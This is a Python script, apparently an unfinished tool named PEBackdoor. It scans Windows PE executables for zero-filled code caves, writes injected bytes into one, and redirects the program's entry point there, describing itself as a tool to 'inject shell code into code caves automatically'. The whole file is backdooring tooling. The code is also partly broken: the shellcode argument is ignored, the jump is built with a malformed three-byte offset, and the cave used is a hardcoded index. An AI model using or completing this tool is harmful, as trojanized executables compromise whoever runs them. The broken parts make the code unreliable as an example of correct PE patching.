#!/usr/bin/python3
import pefile
import functools
import argparse

@functools.total_ordering
class code_cave:
    def __init__(self, location, size, section, virtual_location):
        self.location = location
        self.size = size
        self.section = section
        self.section_name = section.Name
        self.virtual_location = virtual_location
    
    def __lt__(self, other):
        return (self.size) < (other.size)

    def __eq__(self, other):
        return (self.size) == (other.size)

    def print_cave(self):
        print(f"Code cave at real location {hex(self.location)} virtual location {hex(self.virtual_location)} of size {self.size} in {self.section_name.decode()}")

def code_caves(min_size, pe_path):
    """
    This function takes in a pe file, a minimum codecave size, and the path to the pe file.

    """
    pe = pefile.PE(pe_path)
    print("Searching for code caves")
    caves = []

    fd = open(pe_path, "rb")
    for section in pe.sections:
        if section.SizeOfRawData < min_size: #Skip sections too small
            continue
        fd.seek(section.PointerToRawData, 0) 
        data = fd.read(section.SizeOfRawData)
        
        cave_size = 0
        pos = 0
        for byte in data:
            if byte == 0x00:
                cave_size += 1
            else:
                if cave_size > min_size:
                    cave_location = section.PointerToRawData + pos - cave_size
                    virtual_cave_location =  section.VirtualAddress + pos - cave_size
                    caves.append(code_cave(location=cave_location, size=cave_size, section=section, virtual_location=virtual_cave_location))

                cave_size = 0
            pos += 1
    caves.sort(reverse=True)
    return caves

#gives info about specified PE file
def info(file_name):
    pe_path = file_name
    
    pe = pefile.PE(pe_path)

    print(pe.OPTIONAL_HEADER)

#injects just the last jump so far, will expand to 
#create all shell code
def append_jump(file_name, shellcode, output, start):
    to_jmp = (start - 4).to_bytes(3, 'little')

    shellcode = bytes(b"\xE9") + to_jmp

    return shellcode

def write_shellcode(pe, offset, shellcode):
    print("writing shellcode")
    pe.set_bytes_at_offset(offset, shellcode)




def interactive():

    parser = argparse.ArgumentParser(description="Inject shell code into code caves automatically")

    parser.add_argument("-f", "--file", dest="file_name", action="store", required=True,
                        help="PE file", type=str)

    parser.add_argument("-s", "--shell", dest="shellcode", action="store", default=" ",
                        help="shell code", type=str)

    parser.add_argument("-o", "--out", dest="output", action="store", default="out.exe",
                        help="output file", type=str)
    
    parser.add_argument("-i", "--info", dest="info", action="store_true",
                        help="show info for pe")
    args = parser.parse_args()
    
    #if info is set, only print optional header,
    # else run the whole function
    if args.info:
        info(args.file_name)
    else:
        PEBackdoor(args.file_name, args.shellcode, args.output)    

def PEBackdoor(pe_path, shellcode, output, interactive = False):
    print("main function called")
    pe = pefile.PE(pe_path)
    original_start = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    print(hex(original_start))
    new_shellcode = append_jump(pe_path, '', '', original_start)
    print(new_shellcode)
    pe.close()
    caves = code_caves(150, pe_path)
    for cave in caves:
        cave.print_cave()


    print(hex(caves[3].location))
    pe = pefile.PE(pe_path)
    write_shellcode(pe,caves[3].location,new_shellcode)
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = caves[3].virtual_location
    caves[3].print_cave()
    pe.write(output)



if __name__ == "__main__":
    interactive()